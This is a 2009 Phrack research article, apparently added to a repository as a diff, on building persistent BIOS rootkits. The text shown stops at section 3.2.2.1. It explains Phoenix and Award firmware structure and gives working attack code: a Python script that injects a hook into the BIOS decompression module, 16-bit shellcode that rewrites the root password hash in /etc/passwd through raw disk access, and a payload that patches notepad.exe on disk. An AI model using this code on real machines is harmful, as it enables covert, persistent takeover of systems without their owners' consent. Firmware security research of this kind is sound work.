@@ -1,0 +1,1641 @@
+				==Phrack Inc.==
+
+		Volume 0x0d, Issue 0x42, Phile #0x07 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=--------------------=[  Persistent BIOS Infection   ]=-----------------=|
+|=-----------------=[ "The early bird catches the worm" ]=---------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[  .aLS - anibal.sacco@coresecurity.com  ]=------------=|
+|=---------------=[   Alfredo - alfredo@coresecurity.com   ]=------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------------------=[ June 1 2009 ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+------[  Index
+
+  0 - Foreword
+
+  1 - Introduction
+    1.1 - Paper structure
+
+  2 - BIOS basics
+    2.1 - BIOS introduction
+        2.1.1 - Hardware
+        2.1.2 - How it works? 
+    2.2 - Firmware file structure
+    2.3 - Update/Flashing process
+    
+
+  3 - BIOS Infection
+	3.0 - Initial setup
+	3.1 - VMWare's (Phoenix) BIOS modification
+        3.1.1 - Dumping the VMWare BIOS
+        3.1.2 - Setting up VMWARE to load an alternate BIOS
+        3.1.3 - Unpacking the firmware
+		3.1.4 - Modification
+		3.1.5 - Payload
+			3.1.5.1 - The Ready Signal
+		3.1.6 - OptionROM
+
+    3.2 - Real (Award) BIOS modification
+		3.2.1 - Dumping the real BIOS firmware
+		3.2.2 - Modification
+        3.2.3 - Payload
+
+  4 - BIOS32 (Direct kernel infection)
+		
+  5 - Future and other uses
+  	5.1 - SMM!
+
+  6 - Greetz
+
+  7 - References
+
+  8 - Sources - Implementation details
+
+  
+------[ 0.- Foreword
+  
+Dear reader, if you're here we can assume that you already know what 
+the BIOS is and how it works. Or, at least, you have a general 
+picture of what the BIOS does, and its importance for the normal 
+operation of a computer. Based on that, we will briefly explain some 
+basic concepts to get you into context and then we'll jump to the, 
+more relevant, technical stuff.
+  
+------[ 1.- Introduction
+    
+Over the years, a lot has been said about this topic. But, apart of 
+the old Chernobyl virus, which just zeroed the BIOS if you 
+motherboard was one of the supported, or some modifications with 
+modding purposes (that were a very valuable source of data, btw) 
+like Pinczakko's work, we wouldnt be able to find any public 
+implementation of a working, generical and malicious BIOS infection.
+    
+Mostly, the people tends to think that this is a very researched, 
+old and already mitigated technique. It is sometimes even confused 
+whith the obsolet MBR viruses. But, is our intention to show that 
+this kind of attacks are possible and could be, with the aproppiated 
+OS detection and infection techniques, a very trustable and persistent
+rootkit residing just inside of the BIOS Firmware.
+    
+In this paper we will show a generic method to inject code into 
+unsigned BIOS firmwares. This technique will let us embedd our own 
+code into the BIOS firmware so that it will get executed just before
+the loading of the operating system. 
+    
+We will also demonstrate how having complete control of the hard 
+drives allows us to leverage true persistency by deploying fully 
+functional code directly into a windows process or just by modifying 
+sensitive OS data in a Linux box. 
+   
+---[ 1.1 - Paper structure
+  
+The main idea of this paper is to show how the BIOS firmware can be
+modified and used as a persistence method after a successful 
+intrusion.
+		
+So, we will start by doing a little introduction and then we will 
+focus the paper on the proof of concept code, splitting the paper 
+in two main sections:
+		
+  - VMWare's (Phoenix) BIOS modification
+		
+  - Real (Award) BIOS modification
+		
+In each one we will explain the payloads to show how the attack is 
+done, and then we'll jump directly to see the payload code.
+
+		
+------[ 2.- BIOS Basics
+  
+---[2.1 - BIOS introduction
+  
+From Wikipedia [1]:
+    "The BIOS is boot firmware, designed to be the first code run by a 
+    PC when powered on. The initial function of the BIOS is to identify
+    test, and initialize system devices such as the video display card,
+    hard disk, and floppy disk and other hardware. This is to prepare 
+    the machine into a known state, so that software stored on 
+    compatible media can be loaded, executed, and given control of the 
+    PC.[3] This process is known as booting, or booting up, which is 
+    short for bootstrapping."
+
+    "...provide a small library of basic input/output functions that 
+    can be called to operate and control the peripherals such as the 
+    keyboard, text display functions and so forth. In the IBM PC and 
+    AT, certain peripheral cards such as hard-drive controllers and 
+    video display adapters carried their own BIOS extension ROM, which
+    provided additional functionality. Operating systems and executive
+    software, designed to supersede this basic firmware functionality,
+    will provide replacement software interfaces to applications.
+        
+---[2.1.1 - Hardware     
+        
+Back in the 80's the BIOS firmware was contained in ROM or PROM 
+chips, which could not be altered in any way, but nowadays, this 
+firmware is stored in an EEPROM (Electrically Erasable 
+Programmable Read-Only Memory). This kind of memory allows the user
+to reflash it, allowing the vendor to offer firmware updates in 
+order to fix bugs, support new hardware and to add new 
+functionality.
+        
+  
+---[2.1.2 - How it works?
+  
+The BIOS has a very important role in the functioning of a 
+computer.
+It should be always available as it holds the first instruction
+executed by the CPU when it is turned on. This is why it is stored
+in a ROM.
+        
+The first module of the BIOS is called Bootblock, and it's in 
+charge of the POST (Power-on self-test) and Emergency boot 
+procedures. POST is the common term for a computer, router or 
+printer's pre-boot sequence. It has to test and initialize almost 
+all the different hardware components in the system to make sure 
+everything is working properly.
+        
+The modern BIOS has a modular structure, which means that there are
+several modules integrated on the same firmware, each one in charge
+of a different specific task; from hardware initialization to 
+security measures.
+        
+Each module is compressed, therefore there is a decompression 
+routine in charge of the decompression and validation of the 
+others modules that will be subsequently executed.  
+
+After decompression, some other hardware is initialized, such as 
+PCI Roms (if needed) and at the end, it reads the sector 0 of the
+hard drive (MBR) looking for a boot loader to start loading the 
+Operating System.
+        
+        
+---[2.2 - Firmware file structure
+        
+As we said before, the BIOS firmware has a modular structure. When 
+stored in a normal plain file, it is composed of several LZH
+compressed modules, each of them containing an 8 bit checksum.
+        
+However, not all the modules are compressed, a few modules like the
+Bootblock and the Decompression routine are obviously uncompressed 
+because they are a fundamental piece of the booting process and 
+must perform the decompression of the other modules. Further, 
+we will see why this is so convenient for our purposes.
+        
+Here we have the output of Phnxdeco (available in the Debian 
+repositories), an open source tool to parse and analyze the Phoenix
+BIOS Firmware ROMs (that we'll going to extract at 3.1.1):
+
+
++-------------------------------------------------------------------------+
+| Class.Instance (Name)     Packed --->  Expanded      Compression  Offse |
++-------------------------------------------------------------------------+
+
+B.03 (    BIOSCODE)   06DAF (28079) => 093F0 ( 37872)  LZINT ( 74%)  446DFh
+B.02 (    BIOSCODE)   05B87 (23431) => 087A4 ( 34724)  LZINT ( 67%)  4B4A9h
+B.01 (    BIOSCODE)   05A36 (23094) => 080E0 ( 32992)  LZINT ( 69%)  5104Bh
+C.00 (      UPDATE)   03010 (12304) => 03010 ( 12304)   NONE (100%)  5CFDFh
+X.01 (     ROMEXEC)   01110 (04368) => 01110 (  4368)   NONE (100%)  6000Ah
+T.00 (    TEMPLATE)   02476 (09334) => 055E0 ( 21984)  LZINT ( 42%)  63D78h
+S.00 (     STRINGS)   020AC (08364) => 047EA ( 18410)  LZINT ( 45%)  66209h
+E.00 (       SETUP)   03AE6 (15078) => 09058 ( 36952)  LZINT ( 40%)  682D0h
+M.00 (       MISER)   03095 (12437) => 046D0 ( 18128)  LZINT ( 68%)  6BDD1h
+L.01 (        LOGO)   01A23 (06691) => 246B2 (149170)  LZINT (  4%)  6EE81h
+L.00 (        LOGO)   00500 (01280) => 03752 ( 14162)  LZINT (  9%)  708BFh
+X.00 (     ROMEXEC)   06A6C (27244) => 06A6C ( 27244)   NONE (100%)  70DDAh
+B.00 (    BIOSCODE)   001DD (00477) => 0D740 ( 55104)  LZINT (  0%)  77862h
+*.00 (      TCPA_*)   00004 (00004) => 00004 (   004)   NONE (100%)  77A5Ah
+D.00 (     DISPLAY)   00AF1 (02801) => 00FE0 (  4064)  LZINT ( 68%)  77A79h
+G.00 (  DECOMPCODE)   006D6 (01750) => 006D6 (  1750)   NONE (100%)  78585h
+A.01 (        ACPI)   0005B (00091) => 00074 (   116)  LZINT ( 78%)  78C76h
+A.00 (        ACPI)   012FE (04862) => 0437C ( 17276)  LZINT ( 28%)  78CECh
+B.00 (    BIOSCODE)   00BD0 (03024) => 00BD0 (  3024)   NONE (100%)  7D6AAh
+
+
+We can see here the different parts of the Firmware file, 
+containing the DECOMPCODE section, where the decompression routine
+is located, as well as the other not-covered-in-this-paper 
+sections.
+        
+---[2.3 - Update/Flashing process
+    
+The BIOS software is not so different from any other software.
+It's prone to bugs in the same way as other software is. 
+Newer versions come out adding support for new hardware, features 
+and fixing bugs, etc. But the flashing process could be very 
+dangerous on a real machine. The BIOS is a fundamental component 
+of the computer. It's the first piece of code executed when a 
+machine is turned on. This is why we have to be very carefully when
+doing this kind of things. A failed BIOS update can -and probably
+will- leave the machine unresponsive. And that just sucks.
+	
+That is why it's so important to have some testing platform, such 
+as VMWare, at least for a first approach, because, as we'll see,
+there are a lot of differences between the vmware version vs. the
+real hardware version.
+
+------[ 3.- BIOS Infection
+
+---[3.0 - Initial setup
+
+---[3.1 - VMWare's (Phoenix) BIOS modification
+
+First, we have to obtain a valid VMWARE BIOS firmware to work on. 
+        
+In order to read the EEPROM where the BIOS firmware is stored we 
+need to run some code in kernel mode to let us send and receive 
+data directly to the southbridge through the IO Ports. To do this,
+we also need to know some specific data about the current hardware.
+This data is usually provided by the vendor. Furthermore, almost 
+all motherboard vendors provide some tool to update the BIOS, and 
+very often, they have an option to backup or dump the actual 
+firmware.
+
+In VMWare we can't use this kind of tools, because the emulated 
+hardware doesn't have the same functionality as the real hardware.
+This makes sense... why would someone would like to update the
+VMWare BIOS from inside...?
+  
+---[3.1.1 - Dumping the VMWare BIOS
+        
+When we started this, it was really helpful to have the embedded 
+gdb server that VMWare offers. This let us debug and understand 
+what was happening. 
+So in order to patch and modify some little pieces of code to start
+testing, we used some random byte arrays as patterns to find the
+BIOS in memory. 
+Doing this we found that there is a little section of almost 256kb
+in vmware-vmx, the main vmware executable, called .bios440 
+( that in our vmware version is located between the file offset
+0x6276c7-0x65B994 ) that contains the whole BIOS firmware, in the 
+same way as it is contained in a normal file ready to flash.
+	
+You can use objdump to see the sections of the file: 
+		
+objdump -h vmware-vmx
+        
+And you can dump it to a file using the objcopy tool:
+		
+objcopy -j .bios440 -O binary --set-section-flags .bios440=a \ 
+vmware-vmx bios440.rom.zl
+		
+Umm... this means that... if we have root privileges in the victim
+machine, we could use our amazing power to modify the vmware-vmx 
+executable, inserting our own infected bios and it will be 
+executed each time a vmware starts, for every vmware of the 
+computer. Sweet!
+        
+But, there are simpler ways to accomplish this task. We are going 
+to modify it a lot of times and it is not going to work most of 
+the times so.. the simpler, the better.
+
+---[3.1.2 - Setting up VMWARE to load an alternate BIOS
+
+We found that VMWare offers a very practical way to let the user 
+provide an specific BIOS firmware file directly through the .VMX 
+configuration file.
+        
+This not-so-known tag is called "bios440.filename" and it let us 
+avoid using VMWare's built-in BIOS and instead allows us to 
+specify a BIOS file to use.
+        
+You have to add this line in your .VMX file:
+        
+	bios440.filename = "path/to/file/bios.rom"
+        
+And, voila!, now you have another BIOS firmware running in your VM,
+and in 	combination with:
+				
+	debugStub.listen.guest32 = "TRUE" or
+	debugStub.listen.guest64 = "TRUE" 
+		
+that will leave the VMWare's gdb stub waiting for your connection 
+on localhost on port 8832. You will end up with an excellent -and 
+completely debuggable- research scenery.  Nice huh?
+
+Other important hidden tags that can be useful to define are:
+		
+        bios.bootDelay = "3000"                  # To delay the boot X 
+                                                   miliseconds
+        debugStub.hideBreakpoints = "TRUE"       # Allows gdb breakpoints 
+                                                   to work
+        debugStub.listen.guest32.remote = "TRUE" # For debugging from 
+                                                   another machine (32bit)
+        debugStub.listen.guest64.remote = "TRUE" # For debugging from 
+                                                   another machine (64bit)
+        monitor.debugOnStartGuest32 = "TRUE"     # This will halt the VM 
+                                                   at the very first 
+                                                   instruction at 0xFFFF0
+        
+---[3.1.3 - Unpacking the firmware
+
+As we mentioned before, some of the modules are compressed
+with an LZH variation. There are a few available tools to
+extract and decompress each individual module from the
+Firmware file. The most used are Phnxdeco and Awardeco (two
+excellent linux GPL tools) together with Phoenix BIOS Editor
+and Award BIOS editor (some non GPL tools for windows).
+        
+You can use Phoenix BIOS editor over linux using wine if you
+want.  It will extract all the modules in a /temp directory
+inside the Phoenix BIOS editor ready to be open with your
+preferred disassembler.
+		
+The great news about Phoenix BIOS Editor is that it can also
+rebuild the main firmware file. It can recompress and 
+integrate all the different decompressed modules to let it 
+just as it was at the beggining.
+The only thing is that it was done for older Phoenix BIOSes, 
+and it misses the checksum so we will have to do it by 
+ourselves as we'll see at 3.2.2.1
+
+Some of these tasks are done by isolated tools that can be
+invoked directly from a command line, which is very practical
+in order to automate the process with simple scripts.
+		        
+
+---[3.1.4 - Modification
+
+So, here we are. We have all the modules unpacked, and the
+possibility of modifying them, and then rebuild them in a
+fully working BIOS flash update.
+		
+The first thing to deal with now is 'where to patch'. We can
+place a hook in almost any place to get our code executed but
+we have to think things through before deciding on where to
+patch.
+		
+At the beginning we thought about hooking the first
+instruction executed by the CPU, a jump at 0xF000:FFF0. It
+seemed to be the best option because it is always in the same
+place, and is easy to find but we have to take into
+consideration the execution context. To have our code running
+there should imply doing all the hardware initialization by
+ourselves (DRAM, Northbridge, Cache, PCI, etc.) 
+		
+For example, if we want to do things like accessing the hard
+drive we need to be sure that when our code gets executed it
+already has access to the hard drive. 
+		
+For this reason, and because it doesn't change between
+different versions, we've chosen to hook the decompression
+routine. It is also very easy to find by looking for a
+pattern. It is uncompressed, and is called many times during
+the BIOS boot sequence letting us check if all the needed
+services are available before doing the real stuff.
+
+Here we have a dump script to quickly extract the firmware
+modules, assemble the payloads, inject it, and reassemble the
+modified firmware file.
+		
+PREPARE.EXE and CATENATE.EXE are propietary tools to build
+phoenix firmware that you can find inside the Phoenix BIOS
+Editor and packaged with other flashing tools.
+        
+In later versions of this script this tools arent needed anymore. (as
+seen at 3.2.2.1)
+        
+#!/usr/bin/python import os,struct
+
+#--------------------------- Decomp processing ------------------------------
+#assemble the whole code to inject
+os.system('nasm ./decomphook.asm')
+decomphook = open('decomphook','rb').read()
+print "Leido hook: %d bytes" % len(decomphook)
+minihook = '\x9a\x40\x04\x3b\x66\x90' # call near +0x430
+
+#Load the decompression rom
+decorom = open('DECOMPC0.ROM.orig','rb').read()
+
+#Add the hook
+hookoffset=0x23
+decorom = decorom[:hookoffset]+minihook+decorom[len(minihook)+hookoffset:]
+
+#Add the shellcode
+decorom+="\x90"*100+decomphook
+decorom=decorom+'\x90'*10
+
+#recalculate the ROM size
+decorom=decorom[:0xf]+struct.pack("<H",len(decorom)-0x1A)+decorom[0x11:]
+
+#Save the patched decompression rom
+out=open('DECOMPC0.ROM','wb')
+out.write(decorom)
+out.close()
+
+#Compile 
+print "Prepare..."
+os.system('./PREPARE.EXE ./ROM.SCR.ORIG')
+print "Catenate..."
+os.system('./CATENATE.EXE ./ROM.SCR.ORIG')
+os.system('rm *.MOD')
+		
+---[3.1.5 - Payload
+
+Before talking about the payload, we have to resolve *where*
+are we going to store our payload, and this is not a trivial
+task. We found that there is a lot of padding space at the end
+of the decompression routine that, when allocated, will be
+used as a buffer to hold the decompressed code. Trashing in
+this way, any code that we can store there. This adds a bit of
+complexity to the payload, because it makes us split the
+shellcode in two stages.
+
+The first one gets executed by setting a very typical hook in
+the prolog of the decompression routine. A simple relative
+call that redirects the execution flow to our code and moves
+the second stage to a safe hardcoded place that we know
+remains unused during the whole boot process. Then, updates
+the hook making it point to the new address and executes the
+instructions smashed by the original call
+		
+                __________________________________
+                |                                  |
+                |              HOOK                +->---.
+                |..................................|     |
+           .--->|                                  |     |
+           |    |                                  |     |
+           |    |       DECOMPRESSION BLOCK        |     |
+           |    |                                  |     |
+           |    |                                  |     |
+           |    |__________________________________|     |
+           |    |                                  |<----'
+           |    |       First Stage Payload        |
+           |    |       (Moves second stage        |
+           |    |         to a safe place          |
+           |    |       and updates the hook)      |
+           |    |                                  |
+           |    |..................................|
+           `--<-+       Code smashed by hook       |
+                |__________________________________|
+                |                                  |
+                |       Second Stage Payload       |
+                |                                  |
+                |                                  |
+                |__________________________________|
+        
+Lets see the code:
+        
+	|-----------------------------------------------------------|
+
+BITS 16
+
+;Extent to search (in 64K sectors, aprox 32 MB)
+%define EXTENT 10 
+
+start_mover:
+
+   ;save regs
+   ;jmp start_mover
+    pusha
+    pushf
+
+   ; set dst params to move the shellcode
+    xor ax, ax
+    xor di, di
+    xor si, si
+    push cs
+    pop ds
+    mov es, ax ; seg_dst
+    mov di, 0x8000 ; off_dst
+    mov cx, 0xff ; code_size
+
+   ; get_eip to have the 'source' address
+    call b
+b:
+    pop si
+    add si, 0x25  (Offset needed to reach the second stage payload)
+    rep movsw
+
+    mov ax, word [esp+0x12] ; get the caller address to patch the original hook
+    sub ax, 4
+    mov word [eax], 0x8000 ; new_hook offset
+    mov word [eax+2], 0x0000 ; new_hook segment
+
+    ; restore saved regs
+    popf
+    popa
+
+    ; execute code smashed by 'call far'
+    ;mov es,ax
+    mov bx,es
+    mov fs,bx
+    mov ds,ax
+    retf
+		
+		
+    ;Here goes a large nopsled and next, the second stage payload
+		
+	|------------------------------------------------------------|
+
+The second stage, now residing in an unused space, has got to
+have some ready signal to know if the services that we want to
+use are available..
+		
+---[3.1.5.1 - The Ready Signal
+
+
+In the VMWare we've seen that when our second-stage payload is called,
+and the IVT is already initialized, we have all we need to do our
+stuff.  Based on that we chose to use the IVT initialization as our
+ready signal.  This is very simple because it's always mapped at
+0000:0000. Every time the shellcode gets executed first checks if the
+IVT is initialized with valid pointers, if it is the shellcode is
+executed, if not it returns without doing anything.
+
+        
+---[3.1.5.1 - The Real stuff
+  
+Now we have our code executed and we know that we have all the
+services we need so what are we going to do? We can't interact with
+the OS from here. 
+        
+In this moment the operating system is just a char array sitting on
+the disk. But hey! wait, we have access to the disk through the int
+13h (Low Level Disk Services).. we can modify it in any way we want!.
+Ok, let's do it.
+        
+In a real malicious implementation, you would like to code some sort
+of basic driver to correctly parse the different filesystem
+structures, at least for FAT & NTFS (maybe reusing GRUB or LILO code?)
+but for this paper, just as Proof of Concept, we will use the Int 13h
+to sequentially read the disk in raw mode.  We will look for a pattern
+in a very stupid way and it will work, but doing what we said before,
+in a common scenery, will be possible to modify, add and delete any
+desired file of the disk allowing an attacker to drop driver modules,
+infect files, disable the antivirus or anti rootkits, etc.
+
+This is the shellcode that we've used to walk over the whole
+disk matching the pattern: "root:$" in order to find the root
+entry of the /etc/passwd file.
+
+Then, we replace the root hash with our own hash, setting the
+password "root" for the root user.
+
+-------------------------------------------------------------
+; The shellcode doesn't have any type of optimization, we tried to keep it 
+; simple, 'for educational purposes' 
+
+; 16 bit shellcode
+; use LBA disk access to change root password to 'root'
+
+BITS 16	
+	push es
+	push ds
+	pushad
+	pushf
+
+	; Get code address
+	call gca
+gca:    pop bx
+
+	; construct DAP
+	push cs
+	pop ds
+	mov si,bx
+	add si,0x1e0 ; DAP 0x1e0 from code
+	mov cx,bx
+	add cx,0x200 ; Buffer pointer 0x200 from code
+	mov byte [si],16 ;size of SAP
+	inc si
+	mov byte [si],0  ;reserved
+	inc si
+	mov byte [si],1  ;number of sectors
+	inc si
+	mov byte [si],0  ;unused
+	inc si
+	mov word [si],cx ;buffer segment
+	add si,2
+	mov word [si],ds;buffer offset
+	add si,2
+	mov word [si],0 ; sector number
+	add si,2
+	mov word [si],0 ; sector number
+	add si,2
+	mov word [si],0 ; sector number
+	add si,2
+	mov word [si],0 ; sector number
+
+	mov di,0
+	mov si,0
+mainloop:
+	push di
+	push si
+		        
+	;-------- Inc sector number
+	mov cx,3
+	mov si,bx
+	add si,0x1e8
+loopinc:
+	mov ax,word [si]
+	inc ax
+	mov word [si],ax
+	cmp ax,0
+	jne incend
+	add si,2
+	loop loopinc
+incend:
+	;-------- LBA extended read sector
+	mov ah,0x42 ; call number
+	mov dl,0x80 ; drive number 0x80=first hd
+	mov si,bx
+	add si,0x1e0
+	int 0x13
+	jc mainend
+	nop
+	nop
+	nop
+
+	;-------- Search for 'root'
+	mov di,bx
+	add di,0x200 ; pointer to buffer
+	mov cx,0x200 ; 512 bytes per sector
+searchloop:
+	cmp word [di],'ro'
+	jne notfound
+	cmp word [di+2],'ot'
+	jne notfound
+	cmp word [di+4],':$'
+	jne notfound
+	jmp found ; root found!
+notfound:
+	inc di
+	loop searchloop
+
+endSearch:
+	pop si
+	pop di
+
+	inc di
+	cmp di,0
+	jne mainloop
+	inc si
+	cmp si,3
+	jne mainloop
+
+mainend:
+	popf
+	popad
+	pop ds
+	pop es
+	int 3
+found:
+;replace password with: 
+;root:$2a$08$Grx5rDVeDJ9AXXlXOobffOkLOnFyRjk2N0/4S8Yup33sD43wSHFzi:
+;Yes we could've used rep movsb, but we kinda suck.
+	mov word[di+6],'2a'
+	mov word[di+8],'$0'
+	mov word[di+10],'8$'
+	mov word[di+12],'Gr'
+	mov word[di+14],'rD'
+	mov word[di+16],'Ve'
+	mov word[di+18],'DJ'
+	mov word[di+20],'9A'
+	mov word[di+22],'XX'
+	mov word[di+24],'lX'
+	mov word[di+26],'Oo'
+	mov word[di+28],'bf'
+	mov word[di+30],'fO'
+	mov word[di+32],'kL'
+	mov word[di+34],'On'
+	mov word[di+36],'Fy'
+	mov word[di+38],'Rj'
+	mov word[di+40],'k2'
+	mov word[di+42],'N0'
+	mov word[di+44],'/4'
+	mov word[di+46],'S8'
+	mov word[di+48],'Yu'
+	mov word[di+52],'p3'
+	mov word[di+54],'3s'
+	mov word[di+56],'D4'
+	mov word[di+58],'3w'
+	mov word[di+60],'SH'
+	mov word[di+62],'Fz'
+	mov word[di+64],'i:'
+	;-------- LBA extended write sector
+	mov ah,0x43 ; call number
+	mov al,0 ; no verify 
+	mov dl,0x80 ; drive number 0x80=first hd
+	mov si,bx
+	add si,0x1e0
+	int 0x13
+	jmp mainend
+     
+
+
+This other is basically the same payload, but in this case we walk
+over the whole disk trying to match a pattern inside notepad.exe, and
+then we inject a piece of code with a simple call to MessaBoxA and
+ExitProcess to finish it gracefully. 
+
+
+		hook_start:
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+			nop
+		        ;jmp hook_start
+		        ;mov bx,es
+		        ;mov fs,bx
+		        ;mov ds,ax
+		        ;retf
+
+		        pusha
+		        pushf
+		        xor di,di
+			mov ds,di
+			; check to see if int 19 is initialized
+			cmp byte [0x19*4],0x00 
+			jne ifint
+
+		noint:
+		        ;jmp noint ; loop to debug
+		        popf
+		        popa
+		        ;mov es, ax
+		        mov bx, es
+			mov fs, bx
+			mov ds, ax
+		        retf
+
+
+		ifint:
+		        ;jmp ifint ; loop to debug
+			cmp byte [0x19*4],0x46
+		        je noint
+
+		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+		initShellcode:
+		    ;jmp initShellcode ; DEBUG
+		    cli
+		    push es
+		    push ds
+		    pushad
+		    pushf
+
+		    ; Get code address
+		    call gca
+
+		gca:
+		    pop bx
+		    ;---------- Set screen mode
+		    mov ax,0x0003
+		    int 0x10
+		    ;---------- construct DAP
+		    push cs
+		    pop ds
+		    mov si,bx
+		    add si,0x2e0 ; DAP 0x2e0 from code
+		    mov cx,bx
+		    add cx,0x300 ; Buffer pointer 0x300 from code
+		    mov byte [si],16 ;size of SAP
+		    inc si
+		    mov byte [si],0  ;reserved
+		    inc si
+		    mov byte [si],1  ;number of sectors
+		    inc si
+		    mov byte [si],0  ;unused
+		    inc si
+		    mov word [si],cx ;buffer segment
+		    add si,2
+		    mov word [si],ds;buffer offset
+		    add si,2
+		    mov word [si],0 ; sector number
+		    add si,2
+		    mov word [si],0 ; sector number
+		    add si,2
+		    mov word [si],0 ; sector number
+		    add si,2
+		    mov word [si],0 ; sector number
+
+		    mov di,0
+		    mov si,0
+
+		    ;-------- Function 41h: Check Extensions
+		    push bx
+		    mov ah,0x41 ; call number
+		    mov bx,0x55aa;
+		    mov dl,0x80 ; drive number 0x80=first hd
+		    int 0x13
+		    pop bx
+		    jc mainend_near
+		    ;-------- Function 00h: Reset Disk System
+		    mov ah, 0x00
+		    int 0x13
+		    jc mainend_near
+		    jmp mainloop
+		mainend_near:
+		    jmp mainend
+		mainloop:
+		    cmp di,0
+		    jne nochar
+		    ;------- progress bar (ABCDE....)
+		    push bx
+		    mov ax,si
+		    mov ah,0x0e
+		    add al,0x41
+		    mov bx,0
+		    int 0x10
+		    pop bx
+		nochar:
+		    push di
+		    push si
+		    ;jmp incend    ;
+		    ;-------- Inc sector number
+		    mov cx,3
+		    mov si,bx      ; bx = curr_pos 
+		    add si,0x2e8   ; +2e8 LBA Buffer
+
+		loopinc:
+		    mov ax,word [si]
+		    inc ax
+		    mov word [si],ax
+		    cmp ax,0
+		    jne incend
+		    add si,2
+		    loop loopinc
+
+		incend:
+		LBA_read:
+		    ;jmp int_test
+		    ;-------- LBA extended read sector
+		    mov ah,0x42 ; call number
+		    mov dl,0x80 ; drive number 0x80=first hd
+		    mov si,bx
+		    add si,0x2e0
+		    int 0x13
+		    jnc int13_no_err
+		    ;-------- Write error character
+		    push bx
+		    mov ax,0x0e45
+		    mov bx,0x0000
+		    int 0x10
+		    pop bx
+		int13_no_err:
+		    ;-------- Search for 'root'
+		    mov di,bx
+		    add di,0x300 ; pointer to buffer
+		    mov cx,0x200 ; 512 bytes per sector
+
+		searchloop:
+		    cmp word [di],0x706a
+		    jne notfound
+		    cmp word [di+2],0x9868
+		    jne notfound
+		;debugme:
+		;    je debugme
+		    cmp word [di+4],0x0018
+		    jne notfound
+		    cmp word [di+6],0xe801  
+		    jne notfound
+		    jmp found ; root found!
+
+
+		notfound:
+		    inc di
+		    loop searchloop
+
+		endSearch:
+		    pop si
+		    pop di
+
+		    inc di
+		    cmp di,0
+		    jne mainloop
+		    inc si
+		    cmp si,EXTENT ;------------ 10x65535 sectors to read
+		    jne mainloop
+		    jmp mainend
+
+		exit_error:  
+		    pop si
+		    pop di
+
+		mainend:
+		    popf
+		    popad
+		    pop ds
+		    pop es
+		    sti
+
+		    popf
+		    popa
+		    mov bx, es
+		    mov fs, bx
+		    mov ds, ax
+		    retf
+
+		writechar:
+		    push bx
+		    mov ah,0x0e
+		    mov bx,0x0000
+		    int 0x10
+		    pop bx
+		    ret
+		found:
+		    mov al,0x46
+		    call writechar
+
+    		;mov word[di], 0xfeeb ; Infinite loop - Debug
+		    mov word[di], 0x00be
+		    mov word[di+2], 0x0100
+		    mov word[di+4], 0xc700
+		    mov word[di+6], 0x5006
+		    mov word[di+8], 0x4e57
+		    mov word[di+10], 0xc744
+		    mov word[di+12], 0x0446
+		    mov word[di+14], 0x2121
+		    mov word[di+16], 0x0100
+		    mov word[di+18], 0x016a
+		    mov word[di+20], 0x006a
+		    mov word[di+22], 0x6a56
+		    mov word[di+24], 0xbe00
+		    mov word[di+26], 0x050b
+		    mov word[di+28], 0x77d8
+		    mov word[di+30], 0xd6ff
+		    mov word[di+32], 0x00be
+		    mov word[di+34], 0x0000 
+		    mov word[di+36], 0x5600
+		    mov word[di+38], 0xa2be
+		    mov word[di+40], 0x81ca
+		    mov word[di+42], 0xff7c
+		    mov word[di+44], 0x90d6
+
+		;-------- LBA extended write sector
+		    mov ah,0x43 ; call number
+		    mov al,0 ; no verify 
+		    mov dl,0x80 ; drive number 0x80=first hd
+		    mov si,bx
+		    add si,0x2e0
+		    int 0x13
+		    jmp notfound; continue searching
+		    nop	
+	 
+---[3.2 - Real (Award) BIOS modification
+
+VMWare turned to be an excellent BIOS research and development
+platform.  But to complete this research, we have to attack a real
+system.  For this modification we used a common motherboard (Asus
+A7V8X-MX), with an Award-Phoenix 6.00 PG BIOS, a very popular version.
+
+---[3.2.1 - Dumping the real BIOS firmware
+
+FLASH chips are fairly compatible, even interchangeable. But they are
+connected to the motherboard in many different ways (PCI, ISA bridge,
+etc.), and that makes reading them in a generic way a non-trivial
+problem.  How can we make a generic rootkit if we can't even find a
+way to reliably read a flash chip?  Of course, a hardware flash reader
+is a solution, but at the time we didn't have one and is not really an
+option if you want to remotely infect a BIOS without physical access.
+
+So we started looking for software-based alternatives.  The first tool
+that we found worked fine, which was the Flashrom utility from the
+coreboot open-source project, see [COREBOOT] (Also available in the
+Debian repositories).  It contains an extensive database of chips and
+read/write methods. We found that it almost always works, even if you
+have to manually specify the IC model, as it's not always
+automatically detected.
+
+        $ flashrom -r mybios.rom
+
+Generally, the command above is all that you need. The bios should be
+in the mybios.rom file.
+
+A trick that we learned is that if it says that it can't detect the
+Chip, you should do a script to try every known chip. We have yet to
+find BIOS that can't be read using this technique. Writing is slightly
+more difficult, as Flashrom needs to correctly identify the IC to
+allow writing to it. This limitation can by bypassed modifying the
+source code but beware that you can fry your motherboard this way.
+
+We also used flashrom as a generic way to upload the modified BIOS
+back to the motherboard.
+
+---[3.2.2 - Modification
+
+Once we have the BIOS image on our hard disk, we can start the process
+of inserting the malicious payload.
+
+When modifying a real bios, and in particular an award/phoenix BIOS, we
+faced some big problems:
+       	1) Lack of documentation of the bios structure
+    	2) Lack of packing/unpacking tools
+       	3) No easy way to debug real hardware.
+
+There are many free tools to manipulate BIOS, but as it always happen
+with proprietary formats, we couldn't find one that worked with our
+particular firmware.  We can cite the Linux awardeco and phnxdeco
+utilities as a starting point, but they tend to fail on modern BIOS
+versions.
+
+Our plan to achieve execution was:
+       	1) We must insert arbitrary modifications (this implies the
+       	   knowledge of checksum positions and algorithms)
+       	2) A basic hook should be inserted on a generic, easy to
+       	   find portion of the BIOS.
+       	3) Once the generic hook is working, then a Shellcode could be 
+       	   inserted.
+
+
+---[3.2.2.0 - Black Screen of Death
+
+You have to know that you're going to trash a lot of BIOS chips in
+this process.  But most BIOSes have a security mechanism to restore a
+damaged firmware. RTFM (Read the friendly manual of the motherboard)
+
+If this doesn't work, you can use the chip hot-swapping technique: You
+boot with a working chip, then you hot-swap it with the damaged one,
+and reflash. Of course, for this technique you will need to have
+another working backup BIOS.
+
+---[3.2.2.1 - Changing one bit at time
+  
